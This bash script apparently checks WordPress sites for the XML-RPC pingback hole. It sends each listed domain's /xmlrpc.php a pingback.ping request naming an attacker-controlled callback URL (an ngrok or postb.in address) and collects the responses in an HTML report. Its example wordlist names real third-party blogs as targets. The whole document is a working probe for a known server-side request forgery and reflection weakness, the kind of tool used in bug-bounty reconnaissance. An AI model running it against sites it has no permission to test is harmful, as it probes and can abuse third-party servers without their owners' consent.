#!/bin/bash

# Usage: xmlrpc wordlist.txt https://ngrokdomain
# Example data to be present in wordlist.txt
# https://blog.ola.institute
# https://blog.fitbit.com

# After the script execution we will get an output file with name output.html and we can open this with firefox

# Example: xmlrpc test_wordpress_sites.txt https://postb.in/1637949446795-2966150005813

cat << EOF > output.html
<!DOCTYPE html>
<html>
<title>
XMLRPC checker output
</title>
<style>
xmp {
	font-size: 120%;
}
table, th, td { 
	border: 1px solid black;
	border-collapse: collapse;
}
table.center {
  margin-left: auto;
  margin-right: auto;
}
table {
	width: 50%;
}
td {
	padding: 20px;
}
</style>
<body>

<h1><center>XMLRPC checker ouput</center></h1>
<table class="center">
<tr><th>Domain name</th><th>CURL output</th></tr>
EOF

for i in $(cat $1); do echo '<tr><td><h3>'"$i"'</h3></td><td><xmp>' >> output.html; curl -i -s -k --data-binary $'<methodCall><methodName>pingback.ping</methodName><params><param><value><string>'"$2"'</string></value></param><param><value><string>'"$i"'/</string></value></param></params></methodCall>' -X $'POST' "$i/xmlrpc.php" | tee -a output.html; echo '</xmp></td></tr>' >> output.html; done
echo '</table></body></html>' >> output.html

